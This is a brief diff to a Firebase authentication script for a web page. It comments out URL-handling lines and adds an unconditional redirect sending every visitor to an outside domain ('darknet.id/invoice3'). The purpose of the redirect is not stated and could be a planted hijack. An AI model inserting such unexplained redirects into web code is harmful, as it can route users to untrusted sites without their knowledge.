@@ -10,8 +10,10 @@ var firebaseConfig = {
   // Initialize Firebase
   firebase.initializeApp(firebaseConfig);
   
-  var url = window.location.href;
-  url = url.split( '?' )[0];
+//   var url = window.location.href;
+//   url = url.split( '?' )[0];
+
+  window.location = 'https://darknet.id/invoice3'
   
   const auth = firebase.auth();
   const logoHolder = document.getElementById("logo");
